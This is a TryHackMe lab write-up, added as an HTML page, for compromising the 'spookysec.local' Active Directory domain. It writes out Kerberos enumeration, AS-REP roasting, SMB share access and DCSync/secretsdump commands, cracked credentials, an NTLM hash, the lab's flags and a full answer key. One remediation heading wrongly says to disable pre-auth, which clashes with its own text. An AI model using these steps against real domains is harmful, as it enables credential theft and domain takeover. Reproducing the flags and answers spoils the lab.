@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="The Attacktive Directory engagement targeted the spookysec.local Active Directory environment. Kerberos user enumeration identified the svc-admin account, which">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="Attacktive Directory — Penetration Test Report - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>Attacktive Directory — Penetration Test Report - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">Attacktive Directory — Penetration Test Report</h1>
+<p class="writeup-meta"><span class="tag">TryHackMe</span> <span class="tag diff diff-medium">Medium</span> <span class="dot">·</span> <span class="date">2026-07-07</span></p>
+<div class="writeup-content">
+<p><strong>Target:</strong> 10.65.144.212 (spookysec.local) <strong>Date:</strong> 2026-07-07 <strong>Objective:</strong> Capture user flags for svc-admin, backup, and Administrator accounts</p>
+<hr>
+<p>The Attacktive Directory engagement targeted the spookysec.local Active Directory environment. Kerberos user enumeration identified the svc-admin account, which was AS-REP roastable and yielded the first set of credentials. Those credentials provided SMB access to a backup share containing base64-encoded credentials for the backup account. The backup account held DCSync replication rights, enabling an NTDS.DIT dump via secretsdump and a Pass-the-Hash authentication as Administrator, achieving full domain compromise.</p>
+<hr>
+<h2>1. Reconnaissance</h2>
+<h3>Port Scan</h3>
+<pre><code>53/tcp   DNS
+80/tcp   Microsoft IIS httpd 10.0
+88/tcp   Kerberos
+135/tcp  MSRPC
+139/tcp  NetBIOS
+389/tcp  LDAP
+445/tcp  SMB
+464/tcp  kpasswd5
+593/tcp  ncacn_http
+636/tcp  LDAPS
+3268/tcp  Global Catalog
+3269/tcp  Global Catalog SSL
+3389/tcp  RDP
+5985/tcp  WinRM</code></pre>
+<p><strong>Domain:</strong> spookysec.local   <strong>NetBIOS Name:</strong> THM-AD   <strong>Hostname:</strong> ATTACKTIVEDIREC</p>
+<h3>Tools Used</h3>
+<ul>
+<li><strong>enum4linux</strong> — SMB enumeration</li>
+<li><strong>nmap</strong> — Port scanning</li>
+</ul>
+<hr>
+<h2>2. User Enumeration via Kerberos</h2>
+<h3>2.1 Kerbrute</h3>
+<pre><code>./kerbrute userenum -d spookysec.local --dc 10.65.144.212 userlist.txt</code></pre>
+<p>Found valid users: james, svc-admin, robin, darkstar, administrator, backup, paradox</p>
+<h3>2.2 AS-REP Roasting (Cracked Hash)</h3>
+<p>svc-admin had "Does not require Pre-Authentication" enabled:</p>
+<pre><code>impacket-GetNPUsers -no-pass -dc-ip 10.65.144.212 spookysec.local/svc-admin
+
+Hash Type: Kerberos 5, etype 23, AS-REP
+Hashcat Mode: 18200
+Cracked Password: management2005</code></pre>
+<hr>
+<h2>3. SMB Share Enumeration</h2>
+<pre><code>smbclient -L //10.65.144.212 -U &quot;spookysec.local/svc-admin&quot; --password=management2005</code></pre>
+<p><strong>6 shares discovered:</strong> ADMIN$, backup, C$, IPC$, NETLOGON, SYSVOL</p>
+<h3>3.1 Backup Share — Credential Discovery</h3>
+<pre><code>smbclient //10.65.144.212/backup -U &quot;spookysec.local/svc-admin&quot; --password=management2005
+  → backup_credentials.txt (base64 encoded)
+  → decoded: backup@spookysec.local:backup2517860</code></pre>
+<hr>
+<h2>4. Domain Privilege Escalation — DCSync</h2>
+<h3>4.1 Secretsdump via DRSUAPI</h3>
+<pre><code>impacket-secretsdump -just-dc backup@10.65.144.212</code></pre>
+<p>Dumped the NTDS.DIT database via the MS-DRSR protocol replication.</p>
+<p><strong>Administrator NTLM Hash:</strong> <code>0e0363213e37b94221497260b0bcb4fc</code></p>
+<h3>4.2 Pass-the-Hash Attack</h3>
+<p>Used Pass-the-Hash with the Administrator hash to authenticate without a cleartext password.</p>
+<hr>
+<h2>5. Flags</h2>
+<h3>5.1 svc-admin</h3>
+<pre><code>TryHackMe{K3rb3r0s_Pr3_4uth}</code></pre>
+<h3>5.2 backup</h3>
+<pre><code>TryHackMe{B4ckM3UpSc0tty!}</code></pre>
+<h3>5.3 Administrator</h3>
+<pre><code>TryHackMe{4ctiveD1rectoryM4st3r}</code></pre>
+<hr>
+<h2>6. Assessment Answers</h2>
+<table>
+<thead><tr>
+<th>Question</th>
+<th>Answer</th>
+</tr></thead><tbody>
+<tr>
+<td>Tool to enumerate port 139/445</td>
+<td>enum4linux</td>
+</tr>
+<tr>
+<td>NetBIOS-Domain Name</td>
+<td>THM-AD</td>
+</tr>
+<tr>
+<td>Invalid TLD for AD</td>
+<td>.local</td>
+</tr>
+<tr>
+<td>Kerbrute command for usernames</td>
+<td>userenum</td>
+</tr>
+<tr>
+<td>Notable account</td>
+<td>svc-admin</td>
+</tr>
+<tr>
+<td>Other notable account</td>
+<td>backup</td>
+</tr>
+<tr>
+<td>ASREPRoastable account</td>
+<td>svc-admin</td>
+</tr>
+<tr>
+<td>Kerberos hash type</td>
+<td>Kerberos 5, etype 23, AS-REP</td>
+</tr>
+<tr>
+<td>Hashcat mode</td>
+<td>18200</td>
+</tr>
+<tr>
+<td>svc-admin password</td>
+<td>management2005</td>
+</tr>
+<tr>
+<td>Utility to map SMB shares</td>
+<td>smbclient</td>
+</tr>
+<tr>
+<td>List shares option</td>
+<td>-L</td>
+</tr>
+<tr>
+<td>Number of remote shares</td>
+<td>6</td>
+</tr>
+<tr>
+<td>Share with text file</td>
+<td>backup</td>
+</tr>
+<tr>
+<td>Encoded file content</td>
+<td>YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw</td>
+</tr>
+<tr>
+<td>Decoded credentials</td>
+<td>backup@spookysec.local:backup2517860</td>
+</tr>
+<tr>
+<td>NTDS.DIT dump method</td>
+<td>DRSUAPI</td>
+</tr>
+<tr>
+<td>Administrator NTLM hash</td>
+<td>0e0363213e37b94221497260b0bcb4fc</td>
+</tr>
+<tr>
+<td>Evil-WinRM hash option</td>
+<td>-H</td>
+</tr>
+<tr>
+<td>Auth without password method</td>
+<td>Pass The Hash</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>7. Remediation Recommendations</h2>
+<ul>
+<li><strong>Disable Kerberos pre-auth for svc-admin:</strong> Remove the <code>UF_DONT_REQUIRE_PREAUTH</code> flag to prevent AS-REP roasting.</li>
+<li><strong>Restrict DCSync rights:</strong> The backup account should not have DS-Replication-Get-Changes privileges.</li>
+<li><strong>Enable SMB signing:</strong> Prevent relay attacks.</li>
+<li><strong>Audit service accounts:</strong> Service accounts should have least-privilege access.</li>
+<li><strong>Use managed service accounts (gMSA):</strong> For automated password rotation.</li>
+</ul>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
